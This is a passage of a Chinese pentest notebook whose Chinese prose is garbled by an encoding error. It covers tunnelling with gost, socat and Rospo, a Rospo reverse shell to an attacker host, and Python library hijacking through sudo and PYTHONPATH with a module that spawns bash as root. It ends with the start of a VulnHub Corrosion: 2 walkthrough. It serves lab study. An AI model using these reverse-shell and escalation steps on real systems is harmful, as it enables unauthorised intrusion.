- **`-F` å®šä¹‰è½¬å‘é“¾å‡ºå£**ï¼š`-F` å‚æ•°çš„ä½œç”¨èŒƒå›´æ˜¯ **å…¶å·¦ä¾§æœ€è¿‘çš„ `-L`**ï¼ˆå³æŒ‰å‘½ä»¤è¡Œä¸­å‚æ•°é¡ºåºç»‘å®šï¼‰ã€‚
    **è‹¥æ²¡æœ‰æ˜¾å¼æŒ‡å®š `-F`ï¼Œåˆ™é»˜è®¤ç›´è¿ç›®æ ‡åœ°å€ï¼Œä¸ç»è¿‡è½¬å‘é“¾**ã€‚





#### socks5 

æœ¬åœ°å¼€å¯ socks5 å…¥ç«™ï¼Œå°†æ•°æ®é€šè¿‡ relay è½¬å‘åˆ°é¶æœºã€‚

```
gost -L socks5://:1080 -F relay://127.0.0.1:3333?nodelay=true
```



### socat

#### unix è½¬å‘

å°† TCP ç«¯å£çš„æ•°æ®è½¬å‘åˆ°å¥—æ¥å­—

```
socat TCP-LISTEN:3307,reuseaddr,fork UNIX-CONNECT:/var/run/mysqld/mysqld.sock
```



### Rospo

Rospo æ˜¯ä¸€æ¬¾ä¸“ä¸ºåˆ›å»ºå®‰å…¨å¯é  SSH éš§é“çš„å·¥å…·ï¼Œå•ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶é›†æˆå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åŠŸèƒ½ã€‚æ—¨åœ¨è®© SSH éš§é“æŠ€æœ¯é‡æ–°ç„•å‘è¶£å‘³ä¸æ˜“ç”¨æ€§ã€‚



#### SSHD

å¯åŠ¨ ssh æœåŠ¡å™¨

```
rospo sshd -A pass123 -P :2222
```



å®¢æˆ·ç«¯è¿æ¥ ssh æœåŠ¡å™¨

```
ssh root@127.0.0.1 -p 2222
```

```
rospo shell root@127.0.0.1:2222 -p pass123
```



å‘½ä»¤å¸®åŠ©

```
Starts the sshd server

Usage:
  rospo sshd [flags]

Flags:
  -T, --disable-auth                      è‹¥è®¾ç½®åˆ™å®¢æˆ·ç«¯æ— éœ€è®¤è¯å³å¯è¿æ¥
  -D, --disable-shell                     è‹¥è®¾ç½®åˆ™ç¦ç”¨ shell/æ‰§è¡ŒåŠŸèƒ½
  -h, --help                              æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯
  -K, --sshd-authorized-keys string       SSHæœåŠ¡å™¨æˆæƒå¯†é’¥è·¯å¾„ã€‚
                                          æ”¯æŒç±»ä¼¼ https://github.com/<username>.çš„ HTTP URLæ ¼å¼ (é»˜è®¤ 												  "./authorized_keys")
  -A, --sshd-authorized-password string   SSHæœåŠ¡å™¨æˆæƒå¯†ç ã€‚ç•™ç©ºåˆ™ç¦ç”¨å¯†ç éªŒè¯
  -I, --sshd-key string                   SSHæœåŠ¡å™¨å¯†é’¥è·¯å¾„ (é»˜è®¤ "./server_key")
  -P, --sshd-listen-address string        SSHæœåŠ¡å™¨TCPç›‘å¬åœ°å€ (é»˜è®¤ ":2222")

Global Flags:
  -q, --quiet   è‹¥è®¾ç½®åˆ™ç¦ç”¨æ‰€æœ‰æ—¥å¿—è¾“å‡º
```

```
Starts a remote shell

Usageï¼š
  rospo shell [user@]ä¸»æœº[:ç«¯å£] [å‘½ä»¤å­—ç¬¦ä¸²] [å‚æ•°]
  
Flagsï¼š
  -b, --disable-banner         ç¦ç”¨æœåŠ¡å™¨æ¨ªå¹…æ˜¾ç¤º
  -h, --help                   æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯
  -i, --insecure               ç¦ç”¨å·²çŸ¥ä¸»æœºå¯†é’¥éªŒè¯ï¼ˆè·³è¿‡known_hostsæ£€æŸ¥ï¼‰
  -j, --jump-host string       æŒ‡å®šè·³æ¿æœºé…ç½®ï¼ˆå¯é€‰ï¼‰
  -k, --known-hosts string     æŒ‡å®šknown_hostsæ–‡ä»¶ç»å¯¹è·¯å¾„ï¼ˆé»˜è®¤"/root/.ssh/known_hosts"ï¼‰
  -p, --password string        è®¾ç½®SSHå®¢æˆ·ç«¯å¯†ç 
  -s, --user-identity string   æŒ‡å®šSSHèº«ä»½å¯†é’¥ï¼ˆç§é’¥ï¼‰ç»å¯¹è·¯å¾„ï¼ˆé»˜è®¤"/root/.ssh/id_rsa"ï¼‰
  
Global Flagsï¼š
  -q, --quiet   å¯ç”¨é™é»˜æ¨¡å¼ï¼ˆå…³é—­æ‰€æœ‰æ—¥å¿—è¾“å‡ºï¼‰
```



#### åå‘ shell

rospoåå‘Shellçš„æ ¸å¿ƒæœºåˆ¶æ˜¯ï¼šé¶æœºé¦–å…ˆä¸»åŠ¨è¿æ¥è‡³æ”»å‡»æœºçš„SSHæœåŠ¡å™¨ï¼Œé€šè¿‡å»ºç«‹SSHéš§é“å°†æ”»å‡»æœºä¸Šçš„æŒ‡å®šç«¯å£è¿œç¨‹è½¬å‘åˆ°é¶æœºæœ¬åœ°ã€‚ç‰¹åˆ«ä¹‹å¤„åœ¨äºï¼Œ`rospo revshell`å‘½ä»¤ä¼š**è‡ªåŠ¨å®Œæˆä¸¤ä¸ªå…³é”®æ“ä½œ**ï¼šæ—¢å»ºç«‹è¿œç¨‹ç«¯å£è½¬å‘é€šé“ï¼Œåˆç›´æ¥åœ¨é¶æœºç«¯å¯åŠ¨æœ¬åœ°SSHæœåŠ¡ï¼ˆæ— éœ€é¢å¤–éƒ¨ç½²å…¶ä»–SSHæœåŠ¡ç¨‹åºï¼‰ã€‚æ­¤æ—¶æ”»å‡»æœºè¿æ¥è‡ªèº«è¢«è½¬å‘çš„æœ¬åœ°ç«¯å£ï¼Œå³å¯é€šè¿‡åŠ å¯†éš§é“ç›´æ¥è®¿é—®é¶æœºè‡ªå¯åŠ¨çš„SSHæœåŠ¡ã€‚



æ”»å‡»æœºç›‘å¬ 2222 ç«¯å£ï¼Œå¼€å¯ ssh æœåŠ¡ï¼Œå¯†ç ä¸º 111

```
rospo revshell root@10.12.0.100:2222 -i -A 111
```



é¶æœºè¿æ¥åˆ°æ”»å‡»æœº ssh æœåŠ¡ï¼Œå¼€å¯è¿œç¨‹ç«¯å£è½¬å‘ï¼ˆç›‘å¬è¿œç¨‹çš„ 3333 ç«¯å£ï¼‰ï¼Œå¼€å¯æœ¬åœ° ssh æœåŠ¡ï¼Œè®¾ç½®ç«¯å£ä¸º 4444 ï¼ˆè¿œç¨‹ 3333 ç«¯å£è½¬å‘åˆ°æœ¬åœ° 4444 ç«¯å£ï¼‰ï¼Œæœ¬åœ° ssh æœåŠ¡å¯†ç ä¸º 222

```
rospo revshell root@10.12.0.100:2222 -r 127.0.0.1:3333 -i -p 111 -A 222 -P :4444
```



æ”»å‡»æœºä½¿ç”¨ ssh è¿æ¥åˆ°æœ¬åœ°çš„ 3333 ç«¯å£ï¼Œå°±å¯ä»¥è¿æ¥åˆ°é¶æœºçš„ ssh æœåŠ¡ã€‚

```
root@xiaoshae:/opt# ssh root@127.0.0.1 -p 3333

 .---------------.
 | ğŸ¸ rospo sshd |
 .---------------.

root@127.0.0.1's password: 
[root@linux1 ~]# 
```



å‘½ä»¤ç¤ºä¾‹

```
å¯åŠ¨æœ¬åœ°SSHå®ˆæŠ¤è¿›ç¨‹å¹¶å°†å…¶ç«¯å£è½¬å‘è‡³è¿œç¨‹ä¸»æœº

å‰ç½®æ£€æŸ¥ï¼š
  1. è¿œç¨‹æœåŠ¡å™¨å…¬é’¥éœ€å­˜åœ¨äºknown_hostsæ–‡ä»¶ä¸­ï¼ˆä½¿ç”¨insecureå‚æ•°å¯ç¦ç”¨æ­¤éªŒè¯ï¼‰
     å¯é€šè¿‡'grabpubkey'å‘½ä»¤æ˜¾å¼è·å–å…¬é’¥
  2. æ‚¨çš„èº«ä»½å‡­è¯éœ€åœ¨è¿œç¨‹æœåŠ¡å™¨æˆæƒï¼ˆå¯é€šè¿‡keygenå‘½ä»¤ç”Ÿæˆæ–°å‡­è¯ï¼‰
  3. æœ¬åœ°authorized_keysæ–‡ä»¶éœ€å·²åˆ›å»ºä¸”åŒ…å«è‡³å°‘ä¸€ä¸ªå¯†é’¥ä»¥æ”¯æŒåå‘è¿æ¥
     æ­¤å¤„å¯ä½¿ç”¨ä¸åŒé€‰é¡¹ï¼Œè¯·å‚è€ƒ"-K"å‚æ•°è¯´æ˜

ç”¨æ³•ï¼š
  rospo revshell [user@]ä¸»æœº[:ç«¯å£] [å‚æ•°]

ç¤ºä¾‹ï¼š

  # åœ¨user@serverçš„é»˜è®¤è¿œç¨‹åœ°å€:2222å¯åŠ¨åå‘shell
  $ rospo revshell user@server	

  # åœ¨è¿œç¨‹åœ°å€:6666å¯åŠ¨åå‘shellï¼Œå¹¶æ‹‰å–GitHubå…¬é’¥
  $ rospo revshell -r :6666  -K http://github.com/[ç”¨æˆ·].keys user@server

å‚æ•°ï¼š
  -T, --disable-auth                      ç¦ç”¨èº«ä»½éªŒè¯ï¼ˆå…è®¸å®¢æˆ·ç«¯æ— è®¤è¯è¿æ¥ï¼‰
  -b, --disable-banner                    ç¦ç”¨æœåŠ¡å™¨æ¨ªå¹…æ˜¾ç¤º
  -h, --help                              æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯
  -i, --insecure                          ç¦ç”¨å·²çŸ¥ä¸»æœºå¯†é’¥éªŒè¯ï¼ˆè·³è¿‡known_hostsæ£€æŸ¥ï¼‰
  -j, --jump-host string                  æŒ‡å®šè·³æ¿æœºé…ç½®ï¼ˆå¯é€‰ï¼‰
  -k, --known-hosts string                known_hostsæ–‡ä»¶ç»å¯¹è·¯å¾„ï¼ˆé»˜è®¤"/root/.ssh/known_hosts"ï¼‰
  -p, --password string                   SSHå®¢æˆ·ç«¯å¯†ç 
  -r, --remote string                     è¿œç¨‹shellç›‘å¬ç«¯ç‚¹ï¼ˆé»˜è®¤"127.0.0.1:2222"ï¼‰
  -K, --sshd-authorized-keys string       SSHæœåŠ¡ç«¯æˆæƒå¯†é’¥è·¯å¾„ã€‚
                                          æ”¯æŒHTTP URLæ ¼å¼ï¼ˆå¦‚https://github.com/<ç”¨æˆ·å>.keysï¼‰ï¼ˆé»˜è®¤"./authorized_keys"ï¼‰
  -A, --sshd-authorized-password string   SSHæœåŠ¡ç«¯æˆæƒå¯†ç ï¼ˆç©ºå€¼åˆ™ç¦ç”¨è¯¥éªŒè¯ï¼‰
  -I, --sshd-key string                   SSHæœåŠ¡ç«¯å¯†é’¥è·¯å¾„ï¼ˆé»˜è®¤"./server_key"ï¼‰
  -P, --sshd-listen-address string        SSHæœåŠ¡ç«¯ç›‘å¬åœ°å€ï¼ˆé»˜è®¤":2222"ï¼‰
  -s, --user-identity string              SSHèº«ä»½ï¼ˆç§é’¥ï¼‰ç»å¯¹è·¯å¾„ï¼ˆé»˜è®¤"/root/.ssh/id_rsa"ï¼‰

å…¨å±€å‚æ•°ï¼š
  -q, --quiet   å¯ç”¨é™é»˜æ¨¡å¼ï¼ˆå…³é—­æ‰€æœ‰æ—¥å¿—è¾“å‡ºï¼‰
```



#### ç«¯å£è½¬å‘

å°†æœ¬åœ°8080ç«¯å£è½¬å‘è‡³è¿œç¨‹8080ç«¯å£

```
rospo tun forward -l :8080 -r :8080 root@10.12.0.100:2222 -i -p 111
```



ä»æœ¬åœ°5000ç«¯å£åˆ›å»ºåå‘éš§é“è‡³è¿œç¨‹8888ç«¯å£ï¼ˆé€šè¿‡è·³æ¿æœºæœåŠ¡å™¨è¿›è¡Œä»£ç†ï¼‰

```
rospo tun reverse -l :5000 -r :8888  -j root@10.12.0.100:22 root@10.12.0.100:2222 -i -p 111
```



å‘½ä»¤ç¤ºä¾‹

```
åˆ›å»ºå¯é SSHéš§é“çš„å·¥å…·é›†

ç”¨æ³•ï¼š
  rospo [å‚æ•°]
  rospo [å­å‘½ä»¤]

å¯ç”¨å‘½ä»¤ï¼š
  completion   ç”ŸæˆæŒ‡å®šshellçš„è‡ªåŠ¨è¡¥å…¨è„šæœ¬
  dns-proxy    å¯åŠ¨DNS-over-TCPä»£ç†
  get          ä»è¿œç¨‹ä¸»æœºè·å–æ–‡ä»¶
  grabpubkey   æŠ“å–ä¸»æœºå…¬é’¥å¹¶å­˜å…¥known_hostsæ–‡ä»¶
  help         æŸ¥çœ‹ä»»æ„å‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯
  keygen       ç”ŸæˆSSHå¯†é’¥å¯¹
  put          å°†æœ¬åœ°æ–‡ä»¶ä¸Šä¼ è‡³è¿œç¨‹ä¸»æœº
  revshell     å¯åŠ¨åå‘shellè¿æ¥
  run          ä½¿ç”¨é…ç½®æ–‡ä»¶è¿è¡Œrospo
  shell        å¯åŠ¨è¿œç¨‹shellä¼šè¯
  socks-proxy  å¯åŠ¨SOCKSä»£ç†æœåŠ¡
  sshd         å¯åŠ¨SSHå®ˆæŠ¤è¿›ç¨‹
  template     ç”Ÿæˆé…ç½®æ¨¡æ¿æ–‡ä»¶
  tun          åˆ›å»ºå¯é SSHéš§é“

å…¨å±€å‚æ•°ï¼š
  -h, --help     æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯
  -q, --quiet    å¯ç”¨é™é»˜æ¨¡å¼ï¼ˆå…³é—­æ‰€æœ‰æ—¥å¿—è¾“å‡ºï¼‰
  -v, --version  æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯

ä½¿ç”¨ "rospo [å­å‘½ä»¤] --help" æŸ¥çœ‹å…·ä½“å‘½ä»¤çš„è¯¦ç»†è¯´æ˜
```



#### socks

ç›‘å¬æœ¬åœ° 8080 ç«¯å£ï¼Œå…è®¸ socks å…¥ç«™ï¼Œå…¥ç«™æµé‡è½¬å‘åˆ°è¿œç¨‹ä¸»æœºã€‚

```
rospo socks-proxy -i -l 0.0.0.0:8080 -p 111 root@10.12.0.100:2222
```



å‘½ä»¤ç¤ºä¾‹

```
å¯åŠ¨SOCKSä»£ç†æœåŠ¡

æ”¯æŒåè®®ç‰ˆæœ¬ï¼š
  âœ” SOCKS4/SOCKS5 åŒåè®®æ”¯æŒ

ä½¿ç”¨è¯´æ˜ï¼š
  éœ€åœ¨æµè§ˆå™¨ä¸­é…ç½®SOCKSä»£ç†ã€‚Windowsç³»ç»Ÿç”¨æˆ·éœ€åœ¨ä»£ç†é…ç½®ç•Œé¢çš„åœ°å€æ å¡«å†™ "socks=localhost"

ç”¨æ³•ï¼š
  rospo socks-proxy [ç”¨æˆ·@]ä¸»æœº[:ç«¯å£] [å‚æ•°]

ç¤ºä¾‹ï¼š
  # åœ¨127.0.0.1:1080å¯åŠ¨SOCKSä»£ç†
  # é€šè¿‡SSHæœåŠ¡å™¨ï¼ˆsshhost:sshportï¼‰å»ºç«‹éš§é“
  $ rospo proxy sshhost:sshport

å‚æ•°ï¼š
  -b, --disable-banner         ç¦ç”¨æœåŠ¡å™¨æ¨ªå¹…æ˜¾ç¤º
  -h, --help                   æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯
  -i, --insecure               ç¦ç”¨å·²çŸ¥ä¸»æœºå¯†é’¥éªŒè¯
  -j, --jump-host string       æŒ‡å®šè·³æ¿æœºé…ç½®ï¼ˆå¯é€‰ï¼‰
  -k, --known-hosts string     known_hostsæ–‡ä»¶ç»å¯¹è·¯å¾„ï¼ˆé»˜è®¤"/root/.ssh/known_hosts"ï¼‰
  -l, --listen-address string  ä»£ç†ç›‘å¬åœ°å€ï¼ˆé»˜è®¤"127.0.0.1:1080"ï¼‰
  -p, --password string        SSHå®¢æˆ·ç«¯å¯†ç 
  -s, --user-identity string   SSHèº«ä»½ï¼ˆç§é’¥ï¼‰ç»å¯¹è·¯å¾„ï¼ˆé»˜è®¤"/root/.ssh/id_rs
```





#### ç¤ºä¾‹

```
åˆ›å»ºå¯é SSHéš§é“çš„å·¥å…·é›†

ç”¨æ³•ï¼š
  rospo [å‚æ•°]
  rospo [å­å‘½ä»¤]

å¯ç”¨å‘½ä»¤ï¼š
  completion   ç”ŸæˆæŒ‡å®šshellçš„è‡ªåŠ¨è¡¥å…¨è„šæœ¬
  dns-proxy    å¯åŠ¨DNS-over-TCPä»£ç†
  get          ä»è¿œç¨‹ä¸»æœºè·å–æ–‡ä»¶
  grabpubkey   æŠ“å–ä¸»æœºå…¬é’¥å¹¶å­˜å…¥known_hostsæ–‡ä»¶
  help         æŸ¥çœ‹ä»»æ„å‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯
  keygen       ç”ŸæˆSSHå¯†é’¥å¯¹
  put          å°†æœ¬åœ°æ–‡ä»¶ä¸Šä¼ è‡³è¿œç¨‹ä¸»æœº
  revshell     å¯åŠ¨åå‘shellè¿æ¥
  run          ä½¿ç”¨é…ç½®æ–‡ä»¶è¿è¡Œrospo
  shell        å¯åŠ¨è¿œç¨‹shellä¼šè¯
  socks-proxy  å¯åŠ¨SOCKSä»£ç†æœåŠ¡
  sshd         å¯åŠ¨SSHå®ˆæŠ¤è¿›ç¨‹
  template     ç”Ÿæˆé…ç½®æ¨¡æ¿æ–‡ä»¶
  tun          åˆ›å»ºå¯é SSHéš§é“

å…¨å±€å‚æ•°ï¼š
  -h, --help     æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯
  -q, --quiet    å¯ç”¨é™é»˜æ¨¡å¼ï¼ˆå…³é—­æ‰€æœ‰æ—¥å¿—è¾“å‡ºï¼‰
  -v, --version  æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯

ä½¿ç”¨ "rospo [å­å‘½ä»¤] --help" æŸ¥çœ‹å…·ä½“å‘½ä»¤çš„è¯¦ç»†è¯´æ˜
```



## æƒé™æå‡



### msf ä¸€é”®ææƒ





### sudo



### Python åº“åŠ«æŒ

#### PYTHONPATH

Python åœ¨å¯¼å…¥æ¨¡å—æ—¶ï¼Œä¼šæŒ‰ `sys.path` åˆ—è¡¨ä¸­çš„é¡ºåºæœç´¢è·¯å¾„ã€‚æ”»å‡»è€…å¯å°†æ¶æ„åº“æ”¾ç½®åœ¨é«˜ä¼˜å…ˆçº§çš„è·¯å¾„ä¸­ï¼ˆå¦‚å½“å‰å·¥ä½œç›®å½•ï¼‰ï¼Œè¦†ç›–åˆæ³•åº“ã€‚

é€šè¿‡è®¾ç½® `PYTHONPATH` ç¯å¢ƒå˜é‡ï¼Œæ·»åŠ æ”»å‡»è€…æ§åˆ¶çš„ç›®å½•åˆ°æ¨¡å—æœç´¢è·¯å¾„çš„æœ€å‰ç«¯ã€‚



æŸ¥çœ‹ç”¨æˆ·çš„ sudo æƒé™ï¼Œå…è®¸è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œå…è®¸é€šè¿‡ sudo ä»¥ root ç”¨æˆ·å…è®¸æŸä¸ª Python è„šæœ¬ã€‚

```
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) SETENV: PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



Python è„šæœ¬çš„å†…å®¹å¦‚ä¸‹ï¼Œè„šæœ¬ä¸­ä½¿ç”¨ base64ï¼Œå¯ä»¥é€šè¿‡ PYTHONPATH ç¯å¢ƒå˜é‡è¿›è¡ŒåŠ«æŒã€‚

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```



åˆ›å»º /tmp/lib ç›®å½•ï¼Œåˆ›å»º base64.py æ–‡ä»¶

```
-rwxrwxr-x 1 randy randy   33 Mar  3 03:39 base64.py
```



base64.py æ–‡ä»¶çš„å†…å®¹ä¸ºå¯åŠ¨ä¸€ä¸ª bash

```
import os
os.system('/bin/bash')
```



åŠ«æŒæˆåŠŸ

```
randy@corrosion:/tmp/lib$ sudo PYTHONPATH=/tmp/lib/ /usr/bin/python3.8 /home/randy/randombase64.py 
root@corrosion:/tmp/lib# id
uid=0(root) gid=0(root) groups=0(root)
```





#### åº“æ–‡ä»¶ä¿®æ”¹

Python è„šæœ¬ä½¿ç”¨æŸä¸ªåº“æ–‡ä»¶ï¼ˆå¦‚ï¼šbase64.pyï¼‰ï¼Œå…è®¸ä»¥ root ç”¨æˆ·è„šæœ¬ï¼Œç”¨æˆ·å¯ä»¥**ä¿®æ”¹åº“æ–‡ä»¶å†…å®¹**ã€‚



sudo å…è®¸ä»¥ root ç”¨æˆ·è¿è¡Œè„šæœ¬

```
sudo -l

Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



Python è„šæœ¬å¦‚ä¸‹ï¼š

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```



æŸ¥çœ‹ Python æœç´¢åº“çš„è·¯å¾„

```
>>> import sys
>>> print("\n".join(sys.path))

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```



åœ¨ç³»ç»Ÿä¸ŠæŸ¥æ‰¾æ‰€æœ‰ base64.py æ–‡ä»¶

```
locate base64.py

/home/randy/randombase64.py
/snap/core18/2128/usr/lib/python3.6/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py
/usr/lib/python3.8/base64.py
```



æŸ¥çœ‹æ–‡ä»¶çš„æƒé™ï¼ˆå…·æœ‰å†™å…¥æƒé™ï¼‰

```
-rwxrwxrwx 1 root root 20420 Mar  2 16:52 /usr/lib/python3.8/base64.py
```



ä¿®æ”¹ base64.py æ–‡ä»¶

![image-20250303085207798](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250303085207798.png)



sudo æ‰§è¡Œè„šæœ¬ï¼Œè·å¾— root æƒé™ã€‚

```
sudo /usr/bin/python3.8 /home/randy/randombase64.py 

[sudo] password for randy: 
root@corrosion:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```



### åŠ¨æ€é“¾æ¥åº“åŠ«æŒ





## vulnhub

### Corrosion: 2

Nmap æ‰«æ IP åœ°å€ã€‚

```
msf6 > db_nmap -sP -PR -T 5 -n 10.10.10.0/24
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 07:30 UTC
[*] Nmap: Nmap scan report for 10.10.10.1
[*] Nmap: Host is up (0.00047s latency).
[*] Nmap: MAC Address: 00:50:56:C0:00:0A (VMware)
[*] Nmap: Nmap scan report for 10.10.10.103
[*] Nmap: Host is up (0.00016s latency).
[*] Nmap: MAC Address: 00:0C:29:25:CD:30 (VMware)
[*] Nmap: Nmap scan report for 10.10.10.200
[*] Nmap: Host is up (0.000082s latency).
[*] Nmap: MAC Address: 00:50:56:FA:67:12 (VMware)
[*] Nmap: Nmap scan report for 10.10.10.10
[*] Nmap: Host is up.
[*] Nmap: Nmap done: 256 IP addresses (4 hosts up) scanned in 1.53 seconds
```

```
address       mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----  -------  ---------  -----  -------  ----  --------
10.10.10.1    00:50:56:C0:00:0A
10.10.10.10
10.10.10.103  00:0C:29:25:CD:30
10.10.10.200  00:50:56:FA:67:12
```

æ³¨ï¼šæ­¤å¤„é€šè¿‡æ’é™¤æ³•ç¡®å®š 10.10.10.103 æ˜¯é¶æœºï¼ˆå› ä¸ºå…¶ä»–æœºå™¨å…¨æ˜¯æˆ‘çš„ï¼‰ã€‚



Nmap æ‰«æ IP çš„ TCP ç«¯å£ä¿¡æ¯å’Œæ“ä½œç³»ç»Ÿä¿¡æ¯ã€‚

```
msf6 > db_nmap -sS -sV -p- -r -n -T 5 -O 10.10.10.103
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 07:35 UTC
[*] Nmap: Nmap scan report for 10.10.10.103
[*] Nmap: Host is up (0.00040s latency).
[*] Nmap: Not shown: 65532 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: 80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
[*] Nmap: 8080/tcp open  http    Apache Tomcat 9.0.53
[*] Nmap: MAC Address: 00:0C:29:25:CD:30 (VMware)
[*] Nmap: Device type: general purpose|router
[*] Nmap: Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
[*] Nmap: OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 9.28 seconds
```

```
host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.103  22    tcp    ssh   open   OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
10.10.10.103  80    tcp    http  open   Apache httpd 2.4.41 (Ubuntu)
10.10.10.103  8080  tcp    http  open   Apache Tomcat 9.0.53
```

æ³¨ï¼šå­˜åœ¨ä¸¤ä¸ªç½‘ç«™ï¼Œé€šè¿‡æµè§ˆå™¨è®¿é—®ï¼Œæœªå‘ç°æœ‰ç”¨çš„ä¿¡æ¯ã€‚



å°è¯•ä½¿ç”¨ FFUF æ‰«æ 80 ç«¯å£çš„ç½‘é¡µ

```
ffuf -u http://10.10.10.103/indexFUZZ -w web-extensions-big.txt

.html                   [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 5ms]
.html                   [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 2ms]
:: Progress: [66886/66886] :: Job [1/1] :: 18181 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

```
ffuf -u http://10.10.10.103/FUZZ -w raft-medium-files-lowercase.txt

index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 2ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.                       [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 1ms]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htm                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htpasswds              [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htgroup                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htaccess.bak           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htuser                 [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.ht                     [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htc                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
:: Progress: [16244/16244] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

æ³¨ï¼šæ²¡æœ‰å‘ç°ä»»ä½•æœ‰ç”¨çš„ä¿¡æ¯ã€‚ä»¥ . å¼€å¤´çš„ .xxx 403 ä¿¡æ¯æ˜¯è¯¯æŠ¥ã€‚



å°è¯•ä½¿ç”¨ FFUF æ‰«æ 8080 ç«¯å£çš„ç½‘é¡µ

```
ffuf -u http://10.10.10.103:8080/indexFUZZ -w web-extensions-big.txt
.jsp                    [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 37ms]
.jsp                    [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 14ms]
:: Progress: [66886/66886] :: Job [1/1] :: 13333 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

```
ffuf -u http://10.10.10.103:8080/FUZZ -w raft-large-files-lowercase.txt

favicon.ico             [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 22ms]
.                       [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 6ms]
index.jsp               [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 3ms]
readme.txt              [Status: 200, Size: 153, Words: 28, Lines: 3, Duration: 7ms]
backup.zip              [Status: 200, Size: 33723, Words: 146, Lines: 121, Duration: 7ms]
:: Progress: [35325/35325] :: Job [1/1] :: 12500 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

å‘ç° backup.zip æ–‡ä»¶ï¼Œå¯èƒ½æ˜¯ç®¡ç†å‘˜åœ¨å¤‡ä»½æ—¶å¿½è§†å¤§æ„å¿˜è®°åˆ é™¤äº†ï¼Œé€šè¿‡ HTTP æœåŠ¡æš´éœ²å‡ºæ¥äº†ã€‚



ä½¿ç”¨ words å­—å…¸é…åˆ .jsp,.zip,.txt è¿›è¡Œæ‰«æã€‚

```
ffuf -u http://10.10.10.103:8080/FUZZ -w raft-medium-words-lowercase.txt -e .jsp,.zip,.txt

index.jsp               [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 5ms]
docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
